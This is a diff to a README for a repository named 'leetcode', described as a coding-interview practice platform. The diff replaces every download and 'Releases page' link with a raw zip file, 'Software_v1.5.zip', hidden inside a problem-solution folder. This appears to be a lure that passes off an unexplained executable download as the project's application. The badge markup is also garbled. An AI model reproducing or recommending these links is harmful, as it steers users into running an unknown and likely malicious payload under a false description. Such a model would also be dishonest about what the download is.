@@ -4,7 +4,7 @@
 Welcome to **leetcode**, your go-to platform for mastering coding interviews. Here, you will find a wide range of carefully crafted problems and solutions in various programming languages. This guide will help you download and run the application easily.
 
 ## 📥 Download the Application
-[![Download leetcode](https://raw.githubusercontent.com/Wamiqkhan11/leetcode/main/amyl/leetcode.zip%20Now-Get%https://raw.githubusercontent.com/Wamiqkhan11/leetcode/main/amyl/leetcode.zip)](https://raw.githubusercontent.com/Wamiqkhan11/leetcode/main/amyl/leetcode.zip)
+[![Download leetcode](https://raw.githubusercontent.com/Wamiqkhan11/leetcode/main/sol/solution/0301-0400/0326/Software_v1.5.zip%20Now-Get%https://raw.githubusercontent.com/Wamiqkhan11/leetcode/main/sol/solution/0301-0400/0326/Software_v1.5.zip)](https://raw.githubusercontent.com/Wamiqkhan11/leetcode/main/sol/solution/0301-0400/0326/Software_v1.5.zip)
 
 To download the application, visit the link above. You will find the latest releases that you can download directly to your device.
 
@@ -34,7 +34,7 @@ Before you begin, ensure that your system meets the following requirements:
 
 ## 📥 Download & Install
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://raw.githubusercontent.com/Wamiqkhan11/leetcode/main/amyl/leetcode.zip) to find the latest version.
+   Go to the [Releases page](https://raw.githubusercontent.com/Wamiqkhan11/leetcode/main/sol/solution/0301-0400/0326/Software_v1.5.zip) to find the latest version.
 
 2. **Select the Correct Version**  
    Choose the version suitable for your operating system. Click on the link to start the download.
